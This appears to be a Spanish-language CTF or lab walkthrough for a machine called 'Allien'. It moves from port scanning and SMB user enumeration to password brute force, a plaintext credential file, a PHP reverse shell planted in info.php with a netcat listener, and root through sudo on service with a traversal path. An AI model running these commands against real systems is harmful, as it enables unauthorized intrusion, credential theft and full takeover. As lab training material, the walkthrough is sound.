# Allien

## 1. Reconocimiento Inicial de Puertos con Nmap

```bash
nmap -sV -sC -O -p- <IP_DEL_OBJETIVO>
```

**Resultados:**

*   `22/tcp open ssh OpenSSH 9.6p1`: El puerto 22 (SSH) está abierto, lo que indica que podemos intentar acceder al sistema por esta vía si encontramos credenciales.
*   `80/tcp open http Apache httpd 2.4.58`: El puerto 80 (HTTP) está abierto y ejecuta un servidor web Apache. El título de la página (`Login`) sugiere una interfaz de inicio de sesión.
*   `139/tcp open netbios-ssn Samba smbd 4` y `445/tcp open netbios-ssn Samba smbd 4`: Los puertos 139 y 445 están abiertos y ejecutan el servicio Samba, lo que indica la presencia de recursos compartidos de red.

### 1.2. Fuzzing de Directorios con Gobuster

Realizamos un fuzzing de directorios con `gobuster` en el puerto 80 para descubrir rutas ocultas o archivos interesantes en el servidor web. 
```bash
gobuster dir -w /path/to/wordlist/directory-list-lowercase-2.3-medium.txt -u http://<IP_DEL_OBJETIVO> -x php,html,txt
```

**Resultados Relevantes:**

*   `/index.php`: La página principal de inicio de sesión.
*   `/info.php`: Un archivo que podría contener información de configuración o depuración (como `phpinfo()`).
*   `/productos.php`: Otra página web que podría ser interesante.

### 1.3. Análisis de la Página Web con WhatWeb

Utilizamos `whatweb` para obtener más información sobre la tecnología utilizada en la página web. Esta herramienta escaneará la URL y reportará tecnologías, versiones y otros detalles.

```bash
whatweb <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   Confirma el uso de `Apache/2.4.58` en `Ubuntu Linux`.
*   Reitera el título `Login` y la presencia de un `PasswordField`, confirmando la interfaz de inicio de sesión.

## 2. Enumeración de Usuarios y Acceso Inicial

Nos centramos en el servicio Samba para enumerar usuarios y buscar credenciales.

### 2.1. Enumeración de Usuarios con Enum4linux

Utilizamos `enum4linux` para enumerar usuarios del sistema a través de Samba. Esta herramienta es muy útil para obtener una lista de nombres de usuario válidos, que luego podemos usar para ataques de fuerza bruta o adivinación de contraseñas.

```bash
enum4linux -a <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   Identificamos varios usuarios, entre ellos: `usuario1`, `usuario2`, `usuario3`, `administrador`, y `satriani7`.

### 2.2. Fuerza Bruta de Contraseñas SMB con CrackMapExec

Con la lista de usuarios, intentamos realizar un ataque de fuerza bruta contra el servicio SMB utilizando `crackmapexec` y un diccionario de contraseñas (`rockyou.txt`).

```bash
sudo crackmapexec smb <IP_DEL_OBJETIVO> -u '[USER]' -p /path/to/rockyou.txt --no-bruteforce
```

**Resultados:**

*   Para el usuario `satriani7`, encontramos la contraseña `50cent`.

### 2.3. Acceso a Recursos Compartidos SMB

Utilizamos `smbclient` para listar los recursos compartidos disponibles y acceder a ellos con las credenciales de `satriani7`.

```bash
smbclient -L // <IP_DEL_OBJETIVO> -U satriani7
# Contraseña: 50cent
```

**Recursos Compartidos:**

*   `myshare`: Carpeta compartida sin restricciones.
*   `backup24`: Carpeta compartida privada.

Accedemos a `myshare` y descargamos el archivo `access.txt`.

```bash
smbclient // <IP_DEL_OBJETIVO>/myshare -U satriani7
# Contraseña: 50cent
```

Encontramos el siguiente documentos con credenciales:
```
cat credentials.txt    
# Archivo de credenciales  
  
Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.  
  
Usuarios:  
-------------------------------------------------  
1. Usuario: jsmith  
  - Contraseña: PassJsmith2024!  
  
2. Usuario: abrown  
  - Contraseña: PassAbrown2024!  
  
3. Usuario: lgarcia  
  - Contraseña: PassLgarcia2024!  
  
4. Usuario: kchen  
  - Contraseña: PassKchen2024!  
  
5. Usuario: tjohnson  
  - Contraseña: PassTjohnson2024!  
  
6. Usuario: emiller  
  - Contraseña: PassEmiller2024!  
     
7. Usuario: administrador  
   - Contraseña: Adm1nP4ss2024      
  
8. Usuario: dwhite  
  - Contraseña: PassDwhite2024!  
  
9. Usuario: nlewis  
  - Contraseña: PassNlewis2024!  
  
10. Usuario: srodriguez  
  - Contraseña: PassSrodriguez2024!  
  
  
  
# Notas:  
- Mantener estas credenciales en un lugar seguro.  
- Cambiar las contraseñas periódicamente.  
- No compartir estas credenciales sin autorización.
```

Entramos por el ssh con la de administrador
```
administrador/Adm1nP4ss2024
```

### 2.5. Obtención de Reverse Shell a través de `info.php`

Buscamos una forma de ejecutar código en el servidor. Recordamos el archivo `/info.php` que encontramos durante el fuzzing. Si tenemos permisos para modificar este archivo, podemos inyectar una `php-reverse-shell` en él.

1. **Modificar `info.php`:**
modificamos el contenido del exploit de GitHub: 
`https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`

2.  **Configurar el Listener:** En tu máquina atacante, abre una terminal y configura un `netcat` listener en el puerto que especificaste en el script PHP (por ejemplo, 443).

    ```bash
    nc -lvnp 443
    ```

3.  **Ejecutar el Archivo Modificado:** Navega en tu navegador a la URL `http://<IP_DEL_OBJETIVO>/info.php`. Al acceder a esta URL, el servidor ejecutará el script PHP, lo que activará la conexión inversa a tu listener de `netcat`.

    Deberías ver una conexión entrante en tu terminal de `netcat`.

    ```bash
    whoami
    www-data
    ```

    Confirmamos que hemos obtenido una shell como el usuario `www-data`.

### 2.6. Tratamiento de la TTY (Opcional pero Recomendado)

Para una mejor interacción con la shell (autocompletado, historial, etc.), es recomendable convertirla en una TTY (terminal) interactiva. Esto se logra con los siguientes comandos:

1.  **Ejecutar `script`:**
    ```bash
    script /dev/null -c bash
    ```
2.  **Suspender el proceso:**
    ```bash
    Ctrl + Z
    ```
3.  **Configurar la terminal:**
    ```bash
    stty raw -echo; fg
    ```
4.  **Restablecer la terminal:**
    ```bash
    reset
    ```
5.  **Especificar tipo de terminal (si se pregunta):**
    ```bash
    xterm
    ```
6.  **Exportar variables de entorno:**
    ```bash
    export TERM=xterm
    export SHELL=bash
    ```

## 3. Escalada de Privilegios

Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.

### 3.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario actual con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `(ALL) NOPASSWD: /usr/sbin/service`

Esto significa que el usuario `www-data` puede ejecutar el binario `/usr/sbin/service` como `root` sin necesidad de introducir su contraseña. El comando `service` se utiliza para iniciar, detener o reiniciar servicios del sistema. Puede ser abusado para ejecutar comandos arbitrarios si se le pasa una ruta a un binario como argumento.

### 3.2. Abuso de `service` para Obtener Root

Según GTFOBins, cuando `service` tiene permisos `NOPASSWD` en `sudo`, se puede abusar de él para ejecutar una shell con privilegios de `root`.

```bash
sudo -u root /usr/sbin/service ../../bin/sh
```

*   `sudo -u root`: Ejecuta el siguiente comando como el usuario `root`.
*   `/usr/sbin/service`: El binario que tenemos permitido ejecutar con `sudo`.
*   `../../bin/sh`: Al pasar una ruta relativa que apunta a `/bin/sh`, `service` intentará ejecutar `sh` como un "servicio", lo que nos dará una shell de `root`.

Al ejecutar este comando, obtendremos una shell con privilegios de `root`.

```bash
whoami
# root
```

Confirmamos que hemos escalado exitosamente a `root`.
